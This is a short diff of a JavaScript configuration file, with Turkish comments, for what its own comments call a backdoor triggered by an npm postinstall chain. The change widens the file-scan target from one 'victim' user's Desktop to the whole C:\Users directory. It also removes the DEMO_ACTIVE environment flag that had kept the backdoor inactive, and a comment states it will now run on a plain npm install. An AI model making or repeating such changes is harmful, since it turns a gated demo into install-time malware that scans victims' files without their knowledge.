@@ -31,11 +31,10 @@ module.exports = {
   // bilinçli olarak sadece belirli bir klasörle sınırlandırıyoruz.
   // Windows Desktop'u taramak için aşağıdaki yolu kullanıyoruz.
   // NOT: Bu yol, kurban Windows kullanıcı adının "wall-e" olduğu varsayımıyla yazılmıştır.
-  scanRootDir: process.env.DEMO_SCAN_ROOT || "C:\\Users\\wall-e\\Desktop",
+  scanRootDir: process.env.DEMO_SCAN_ROOT || "C:\\Users",
 
-  // --- Postinstall Zincirini Tetikleme Bayrağı ---
-  // Bu bayrak olmadan npm install çalıştırıldığında backdoor devreye girmez.
-  requiredEnvFlag: "DEMO_ACTIVE",
+  // --- Postinstall Zincirini Tetikleme Bayrağı (ARTIK KULLANILMIYOR) ---
+  // requiredEnvFlag: "DEMO_ACTIVE",  // Kaldırıldı, direkt npm install çalışacak.
 
   // --- Dosya Tarama Desenleri (Opsiyonel, filescanner.js'de zaten tanımlı) ---
   // Burada sadece bilgi amaçlı, asıl desenler filescanner.js içinde.
